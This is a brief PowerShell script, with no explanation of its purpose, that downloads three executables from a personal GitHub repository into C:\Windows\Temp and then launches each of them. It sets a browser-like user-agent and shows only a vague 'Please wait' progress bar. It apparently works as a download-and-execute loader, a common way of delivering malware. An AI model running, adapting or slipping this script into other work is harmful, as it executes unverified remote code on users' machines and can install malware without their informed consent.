$downloads = @(
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/Timeless.exe'; Path = 'C:\Windows\Temp\Timeless.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/timeless_scanner.exe'; Path = 'C:\Windows\Temp\timeless_scanner.exe' },
    @{ URL = 'https://github.com/fosslas/users/raw/refs/heads/main/block_majestic.exe'; Path = 'C:\Windows\Temp\block_majestic.exe' }
)

foreach ($item in $downloads) {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

        $req = [System.Net.HttpWebRequest]::Create($item.URL)
        $req.AllowAutoRedirect = $true
        $req.UserAgent = "Mozilla/5.0"
        $response = $req.GetResponse()
        $totalBytes = $response.ContentLength
        $stream = $response.GetResponseStream()
        $fileStream = [System.IO.File]::Create($item.Path)

        $buffer = New-Object byte[] 8192
        $bytesRead = 0
        $totalRead = 0

        while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -gt 0) {
            $fileStream.Write($buffer, 0, $bytesRead)
            $totalRead += $bytesRead

            if ($totalBytes -gt 0) {
                $pct = [int](($totalRead / $totalBytes) * 100)
                Write-Progress -Activity "Downloading..." -Status "Please wait" -PercentComplete $pct
            }
        }

        $fileStream.Close()
        $stream.Close()
        $response.Close()

        Write-Progress -Activity "Downloading..." -Status "Please wait" -Completed
    }
    catch {
        Write-Host "Ошибка: $($_.Exception.Message)" -ForegroundColor Red
    }
}

foreach ($item in $downloads) {
    Start-Process $item.Path
}
